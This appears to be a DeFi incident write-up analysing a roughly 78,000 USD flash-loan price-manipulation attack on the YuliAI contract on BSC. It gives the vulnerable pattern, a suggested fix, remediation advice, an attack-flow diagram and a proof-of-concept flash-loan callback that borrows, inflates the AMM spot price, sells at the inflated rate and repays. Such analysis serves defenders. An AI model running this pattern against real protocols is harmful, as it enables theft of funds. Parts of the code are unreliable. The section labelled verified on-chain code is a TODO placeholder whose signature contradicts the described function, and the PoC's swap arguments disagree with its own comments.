# YuliAI — Flash Loan-Based Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-06 |
| **Protocol** | YuliAI |
| **Chain** | BSC |
| **Loss** | ~78,000 USD |
| **Attacker** | [0x26f8bf8a772b8283bc1ef657d690c19e545ccc0d](https://bscscan.com/address/0x26f8bf8a772b8283bc1ef657d690c19e545ccc0d) |
| **Attack Tx** | [0xeab946cf...](https://bscscan.com/tx/0xeab946cfea49b240284d3baef24a4071313d76c39de2ee9ab00d957896a6c1c4) |
| **Vulnerable Contract** | [0x8262325Bf1d8c3bE83EB99f5a74b8458Ebb96282](https://bscscan.com/address/0x8262325Bf1d8c3bE83EB99f5a74b8458Ebb96282) |
| **Root Cause** | The `sellToken` function relies on a manipulable PancakeSwap AMM spot price to determine the exchange rate |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/YuliAI_exp.sol) |

---

## 1. Vulnerability Overview

The victim contract (`0x8262...`) of the YuliAI protocol allows users to exchange YULIAI tokens for USDT via the `sellToken` function. This function internally uses the PancakeSwap spot price to calculate the exchange rate. The attacker borrowed a large amount of USDT via a Moolah flash loan to manipulate the pool price, then sold tokens at a favorable rate, stealing approximately 78,000 USD.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: uses spot price directly, exposed to flash loan manipulation
function sellToken(uint256 tokenAmount) payable external {
    // Calculates USDT payout based on current AMM spot price
    // → Manipulating pool price via flash loan allows receiving more USDT than actual value
    uint256 usdtOut = getSpotPrice() * tokenAmount;
    IERC20(USDT).transfer(msg.sender, usdtOut);
}

// ✅ Recommended fix: use TWAP or an external oracle
function sellToken(uint256 tokenAmount) payable external {
    uint256 usdtOut = getTWAPPrice() * tokenAmount; // Use manipulation-resistant price
    IERC20(USDT).transfer(msg.sender, usdtOut);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: YuliAI_decompiled.sol
contract YuliAI {
    function sellToken(uint256 a) external view returns (address) {  // ❌ Vulnerability
        // TODO: decompilation logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Request Moolah flash loan (borrow large amount of USDT)
  │
  ├─[2]─▶ Buy large amount of YULIAI on PancakeSwap pool
  │         └─ YULIAI price spikes (spot price manipulated)
  │
  ├─[3]─▶ Call victim.sellToken(YULIAI)
  │         └─ Receive excess USDT based on manipulated high price
  │
  ├─[4]─▶ Sell YULIAI on PancakeSwap (price recovers)
  │
  └─[5]─▶ Repay flash loan + retain profit
              └─ ~78,000 USD profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Attack contract core logic
function onMoolahFlashLoan(uint256 assets, bytes calldata userData) public {
    // [1] Use USDT received from flash loan to buy large amount of YULIAI
    // → Drive up PancakeSwap spot price
    swap(YULIAI, address(USDT_ADDR), assets);

    // [2] Call sellToken at manipulated price
    // → Victim contract pays out USDT based on the inflated spot price
    IVictim(VICTIM).sellToken{value: msg.value}(tokenBalance);

    // [3] Swap received YULIAI back to USDT (price normalizes)
    swap(address(USDT_ADDR), YULIAI, yuliaiBalance);

    // [4] Repay flash loan principal + fee
    IERC20(USDT_ADDR).transfer(msg.sender, assets + fee);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Price Oracle Manipulation |
| **Attack Vector** | Flash Loan + AMM Spot Price Manipulation |
| **Impact** | Fund Theft |
| **CWE** | CWE-20: Improper Input Validation |
| **DASP Classification** | Oracle / Price Manipulation |

## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Use PancakeSwap V3's TWAP (Time-Weighted Average Price) to gain resistance against short-term price manipulation.
2. **Integrate External Price Oracle**: Use a decentralized oracle such as Chainlink to eliminate reliance on on-chain spot prices.
3. **Slippage Limits**: Add guard conditions that reject transactions when the price deviates beyond a defined range.
4. **Reentrancy Lock and Flash Loan Prevention**: Add logic to detect flash loan usage within the same block.

## 7. Lessons Learned

- AMM spot prices can be easily manipulated within a single transaction via flash loans, and therefore **must never be used alone as a price reference**.
- Functions that exchange assets by referencing an external price — such as `sellToken` — must use a manipulation-resistant oracle.
- Flash loans are themselves a neutral tool, but they become a powerful attack vector when a protocol is vulnerable to intra-block price fluctuations.